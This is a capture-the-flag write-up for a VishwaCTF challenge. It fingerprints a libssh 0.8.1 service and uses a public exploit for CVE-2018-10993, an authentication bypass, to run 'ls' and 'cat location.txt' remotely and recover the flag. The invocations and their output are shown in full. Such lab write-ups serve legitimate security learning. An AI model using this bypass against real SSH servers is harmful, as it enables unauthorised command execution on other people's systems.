# Challenge 2: Save The City
Question: The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!

We are given a netcat connection and using the command, we get a weird SSH version and it disconnects automatically after a few seconds.

```
└─$ nc 13.234.11.113 32657
SSH-2.0-libssh_0.8.1

Bye Bye                                                                                                                                                      
```
I later got to know that this is  CVE-2018-10993. Using an [exploit](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d) on GitHub, we can perform commands remotely via the exploit.

```
└─$ python cve-2018-10993.py 13.234.11.113 -p 32657 -c 'ls'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1
    
bin
boot
dev
etc
home
lib
lib64
location.txt
media
mnt
opt
proc
root
run
sbin
srv
ssh_server_fork.patch
sys
tmp
usr
var
```

A suspicious text file can be found.

```
└─$ python cve-2018-10993.py 13.234.11.113 -p 32657 -c 'cat location.txt'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1
    
elrow-club-pune
```
Flag: `VishwaCTF{elrow-club-pune}`
